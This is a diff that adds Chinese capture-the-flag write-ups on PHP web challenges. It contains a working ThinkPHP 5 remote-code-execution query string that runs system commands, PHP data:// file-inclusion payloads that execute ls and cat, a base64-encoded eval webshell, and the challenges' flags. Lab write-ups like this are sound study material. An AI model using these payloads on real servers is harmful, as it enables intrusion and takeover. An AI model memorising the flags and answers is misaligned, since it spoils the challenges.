@@ -488,3 +488,46 @@ echo base64_encode($serial);  // TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo
 > 将 payload 带入 url 执行后可得 flag：ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}
 
 <br>
+
+### php_rce
+
+题解：查询 thinkphpv5.02 版本漏洞，直接抄上去就好不用理解
+
+首先拿到代码，这是代码格式：  
+`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=需要执行的shell代码`
+
+我们直接使用 ls 查看当前目录下的文件，payload 为  
+`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`
+
+发现都是些没用的玩意，直接查看根目录  
+`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20/`
+
+发现出现了 flag 文件夹，我们直接进去就可以看见 flag 了，是不是很简单  
+`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag`
+
+> 答案：flag{thinkphp5_rce}
+
+<br>
+
+### Web_php_include
+
+题解：避免使用 php://，使用其他方法代替绕过
+
+**方法一：data 伪协议**  
+先使用 data 伪协议调用 php 执行代码，查看当前目录下所有文件  
+`?page=data://text/plain,<?php system("ls")?>`
+
+发现 flag 文件，使用 cat 指令查看文件内容即可  
+`?page=data://text/plain,<?php system("cat fl4gisisish3r3.php")?>`
+
+打开开发者工具，查看源代码，即可发现 flag
+
+<br>
+
+**方法二：data 伪协议上传木马**  
+data 协议直接上传 php 代码原文： `data://text/plain,<?php xxx ?>`  
+data 协议上传 base64 加密后内容：`data://text/plain;base64, JTNDJTNGcGhwJTIwQGV2YWwlMjglMjRfUE9TVCU1QiUyMmZ1Y2slMjIlNUQlMjklM0I=`
+
+<br>
+
+###
